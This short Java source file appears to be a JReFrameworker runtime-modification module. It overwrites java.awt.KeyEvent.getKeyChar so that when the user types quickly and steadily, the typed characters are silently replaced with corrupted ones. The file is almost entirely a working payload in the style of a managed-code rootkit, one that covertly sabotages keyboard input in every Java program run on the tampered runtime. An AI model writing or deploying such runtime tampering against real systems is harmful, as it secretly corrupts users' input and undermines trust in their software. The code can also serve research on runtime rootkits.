package java.awt;

import java.awt.Component;
import java.awt.event.KeyEvent;

import jreframeworker.operations.annotations.jref_overwrite;
import jreframeworker.operations.interfaces.JREF_Merge;

public class SpellWreckedKeyEvent extends KeyEvent implements JREF_Merge {

	public SpellWreckedKeyEvent(Component arg0, int arg1, long arg2, int arg3, int arg4, char arg5, int arg6) {
		super(arg0, arg1, arg2, arg3, arg4, arg5, arg6);
	}

	private long lastAction = System.currentTimeMillis();
	private final SpellWrecker.Monitor monitor = new SpellWrecker.Monitor(1000, 5); // 1 second window, with 5 second history
	
	@jref_overwrite
	public char getKeyChar(){
		char original = super.getKeyChar();
		monitor.observe();
		if(monitor.getAverageObservations() > 3){
			if(monitor.getHistoricalStandardDeviation() < 3.5){
				if(System.currentTimeMillis() - lastAction > 700){
					char spellwrecked = SpellWrecker.spellwreck(original);
					super.setKeyChar(spellwrecked); // just being thorough and updating the state of the object
					lastAction = System.currentTimeMillis();
					return spellwrecked;
				}
			}
		}
		return original;
	}

}
